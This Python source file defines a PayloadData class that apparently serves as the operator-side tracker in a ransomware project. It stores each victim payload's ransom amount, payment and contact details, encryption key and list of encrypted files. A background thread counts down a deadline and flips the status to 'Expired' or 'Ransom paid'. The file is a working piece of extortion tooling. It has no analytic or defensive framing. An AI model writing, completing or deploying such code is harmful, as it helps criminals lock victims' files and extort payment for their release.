import datetime, threading
from base64 import b64encode

STATUS_INACTIVE = "Inactive"
STATUS_ACTIVE = "Active"
STATUS_PAID = "Ransom paid"
STATUS_NO_FILES = "No file found"
STATUS_EXPIRED = "Expired"

class PayloadData:
    """
    Stores payload data
    """
    def __init__(self, payload_id:str, payment:int, time_limit:int, payment_details:str, contact_details:str):
        """
        Initializes payload data
        :param payload_id: str
        :param payment: int
        :param time_limit: int
        :param payment_details: str
        :param contact_details: str
        """
        self.id = payload_id
        self.payment = payment
        self.time_limit = time_limit
        self.payment_details = payment_details
        self.contact = contact_details

        # encryption data
        self.cipher_key = None
        self.files = []
        self.status = STATUS_INACTIVE
        self.encryption_date = None
        self.deadline = None

        self.follow_deadline_thread = threading.Thread(target=self.follow_deadline)
        if self.status == STATUS_ACTIVE:
            self.follow_deadline_thread.start()

    def follow_deadline(self):
        """
        Follows the time limit and sets the payloads status
        :return: None
        """
        while True:
            # if time ran out and the payload is still active
            if (self.deadline - datetime.datetime.now()).total_seconds() <= 0 and self.status == STATUS_ACTIVE:
                self.status = STATUS_EXPIRED
            # stops if time is expired or ransom was paid
            if self.status == STATUS_EXPIRED or self.status == STATUS_PAID:
                break

    def activate(self, date):
        """
        Sets the payload as active and track the time limit
        :param date: str
        :return: None
        """
        self.status = STATUS_ACTIVE
        self.set_time(date)
        self.follow_deadline_thread.start()

    def is_active(self):
        """
        Returns whether the payload is active
        :return: bool
        """
        return self.status == STATUS_ACTIVE

    def set_cipher_key(self, cipher_key):
        """
        Sets cipher key
        :param cipher_key: bytes
        :return: None
        """
        self.cipher_key = cipher_key

    def add_encrypted_file(self, _file):
        """
        Adds new encrypted file to the payloads files list
        :param _file: str; file's path
        :return: None
        """
        self.files.append(_file)

    def set_time(self, time):
        """
        Sets encryption time and calculates it's deadline
        :param time: str
        :return:
        """
        self.encryption_date = datetime.datetime.strptime(time, "%d/%m/%y %H:%M:%S")
        self.deadline = self.encryption_date + datetime.timedelta(hours=self.time_limit)

    def get_remaining_time(self):
        """
        Returns remaining deadline time in H:M:S format
        :return: str
        """
        time = (self.deadline - datetime.datetime.now()).total_seconds()
        hours, remainder = divmod(time, 3600)
        minutes, seconds = divmod(remainder, 60)
        return "{}:{}:{}".format(str(hours), str(minutes), str(seconds))

    def get_dates(self):
        """
        Returns encryption and deadline dates
        :return: tuple
        """
        return self.encryption_date.strftime("%d/%m/%y %H:%M:%S") if self.encryption_date else "Not yet",\
               self.deadline.strftime("%d/%m/%y %H:%M:%S") if self.deadline else "Not yet"

    def get_info(self):
        """
        Returns all payload's data
        :return: dict
        """
        info = self.__dict__
        dates = self.get_dates()
        info["encryption_time"] = dates[0]
        info["deadline"] = dates[1]

        return info

    def get_summary(self):
        """
        Returns summarized payload's data
        :return: tuple
        """
        return self.id, self.status, b64encode(self.cipher_key), self.get_dates()[1], str(self.payment), self.payment_details, self.contact


    def get_encryption_data(self):
        """
        Returns payload's encryption's status, files and deadline
        :return: dict
        """
        return {'status': self.status,
                'files': self.files,
                'deadline': self.get_dates()[1]}

    def get_cipher_key(self, encoded=False):
        return b64encode(self.cipher_key) if encoded else self.cipher_key